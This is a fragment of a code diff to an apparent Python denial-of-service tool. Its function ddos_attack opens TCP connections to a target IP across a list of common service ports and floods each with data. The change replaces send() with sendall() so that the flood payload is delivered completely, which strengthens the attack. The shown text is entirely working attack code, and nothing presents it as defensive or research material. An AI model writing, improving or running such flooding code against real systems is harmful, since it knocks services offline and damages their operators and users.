@@ -48,7 +48,7 @@ def ddos_attack(target_ip_address, how_much_attacks):
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as dos_attacking_on_tcp:
                     try: dos_attacking_on_tcp.connect((target_ip_address, port))
                     except: break
-                    try: print(f'Ddos-Attacking --> {target_ip_address}'), dos_attacking_on_tcp.send(words.encode('ascii'))
+                    try: print(f'Ddos-Attacking --> {target_ip_address}'), dos_attacking_on_tcp.sendall(words.encode('ascii'))
                     except: pass
         for port_tcp in [1, 2, 20, 21, 22, 23, 25, 33, 53, 80, 110, 123, 135, 137, 138, 139, 161, 443, 445, 1025, 1080, 3389, 5000, 8080]: _starting_tcp(port_tcp)
     def _dos_attack_on_udp(): 
